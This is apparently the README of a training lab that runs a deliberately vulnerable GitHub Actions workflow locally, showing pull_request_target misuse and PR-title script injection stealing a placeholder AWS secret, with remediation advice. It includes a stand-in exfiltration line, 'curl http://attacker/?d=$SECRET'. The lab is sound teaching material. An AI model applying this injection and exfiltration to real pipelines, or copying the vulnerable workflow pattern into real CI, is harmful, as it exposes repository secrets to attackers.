Cloud Lab 10. CICD-Pipeline-Secret-Leak — Python runner + GitHub Actions workflow, self-contained  ✅ (exploit verified on this box)

A vulnerable GitHub Actions workflow (.github/workflows/ci.yml) combines two real
CI/CD flaws. runner.py is a minimal, faithful Actions-style executor so you can
run the pipeline locally and watch a malicious pull-request title steal the repo's
AWS secret — no GitHub account, no runners.

  VULN 1 — pull_request_target: the workflow runs WITH repo secrets even for
           untrusted fork PRs, and checks out the attacker-controlled head SHA.
  VULN 2 — script injection: the attacker-controlled expression
           ${{ github.event.pull_request.title }} is interpolated directly into a
           shell `run:` step, so a crafted PR title executes arbitrary commands
           with the secrets present in the environment.

1: Get the lab:   unzip CICD-Pipeline-Secret-Leak.zip && cd 10-CICD-Pipeline-Secret-Leak
2: Run the pipeline (native — verified here):   needs Python 3 + PyYAML
   # Benign PR — the title just gets echoed:
   python3 runner.py .github/workflows/ci.yml event-benign.json
   # Attacker PR — the malicious title (event-attacker.json) injects shell and
   # exfiltrates the secret:
   python3 runner.py .github/workflows/ci.yml event-attacker.json
   #   step output includes:  STOLEN_AWS_KEY=ci-cd-pipeline-super-secret-key-EXAMPLE-98765
   #   and drops attacker_exfil.log (stands in for  curl http://attacker/?d=$SECRET )
   cat attacker_exfil.log
   #   -> STOLEN_AWS_KEY=ci-cd-pipeline-super-secret-key-EXAMPLE-98765
3: Reset:  rm -f attacker_exfil.log

Files:
    .github/workflows/ci.yml   the vulnerable workflow (read the inline comments)
    runner.py                  local Actions-style executor (expands ${{ github.event.* }})
    secrets.json               the repo secrets the pipeline exposes
    event-attacker.json        malicious PR event (title carries the injection)
    event-benign.json          normal PR event (control)

Requirements:
    Python 3 + PyYAML          (apt: python3-yaml, or pip: pyyaml)  — verified with PyYAML 6.0.3
    bash                       (runner executes each `run:` step in bash)

List of Vulnerabilities (all verified on this box):
    pull_request_target with secrets — the workflow trusts fork PRs while repo
        secrets are in scope, and checks out the untrusted head SHA.
    Shell script injection — an attacker-controlled ${{ github.event.* }} value
        is interpolated into a `run:` step and executed.
    CI secret exfiltration — a crafted PR title reads AWS_SECRET_ACCESS_KEY from
        the environment and exfiltrates it.

Remediation: use pull_request (not pull_request_target) for untrusted PRs, or gate
with environments/required approvals; never interpolate ${{ github.event.* }} into
run: — pass it via env: and quote it; scope/rotate CI secrets and use OIDC short-lived creds.
